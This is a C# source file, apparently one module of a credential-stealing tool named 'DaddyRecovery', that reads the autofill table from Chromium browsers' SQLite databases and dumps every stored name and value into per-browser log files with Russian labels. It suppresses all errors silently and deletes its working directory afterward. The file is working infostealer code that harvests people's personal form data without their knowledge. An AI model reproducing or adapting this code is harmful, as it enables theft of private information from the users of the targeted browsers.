namespace DaddyRecovery.Browsers.Chromium
{
    using System;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using Helpers;

    public static class GetAutoFill
    {
        private const string COMMANDTEXT = "SELECT name, value, value_lower FROM autofill";

        public static void Inizialize_AutoFill()
        {
            foreach (string v in Searcher.Database)
            {
                string BrowserName = CombineEx.GetFileNameWithoutExtension(v);
                string save = CombineEx.CombinePath(GlobalPath.AutoFillLogs, $"{BrowserName}.txt");

                try
                {
                    using (var Connect = new SQLiteConnection($"Data Source={v};Version=3;New=False;Compress=True;"))
                    {
                        Connect.Open();
                        using (var ComText = new SQLiteCommand(COMMANDTEXT, Connect))
                        using (SQLiteDataReader reader = ComText.ExecuteReader())
                        {
                            if (!reader.HasRows) { continue; }
                            else { SaveLogs(BrowserName, save, reader); }
                        }
                        SQLiteConnection.ClearPool(Connect);
                    }
                }
                catch { continue; }
            }
            CombineEx.CreateOrDeleteDirectoryEx(false, CombineEx.CombinePath(GlobalPath.HomePath, "WebData"));
        }

        private static void SaveLogs(string BrowserName, string save, SQLiteDataReader reader)
        {
            try
            {
                using (var SwLog = new StreamWriter(save))
                {
                    while (reader.Read())
                    {
                        string name = reader[0]?.ToString();
                        string value = reader[1]?.ToString();
                        string value_lower = reader[2]?.ToString();

                        SwLog.WriteLine($"Имя браузера: {BrowserName}");
                        SwLog.WriteLine($"Имя: {name}");
                        SwLog.WriteLine($"Значение: {value}");
                        SwLog.WriteLine($"Значение в нижнем регистре: {value_lower}");
                        SwLog.WriteLine();
                        SwLog.Flush();
                    }
                }
            }
            catch { }
        }
    }
}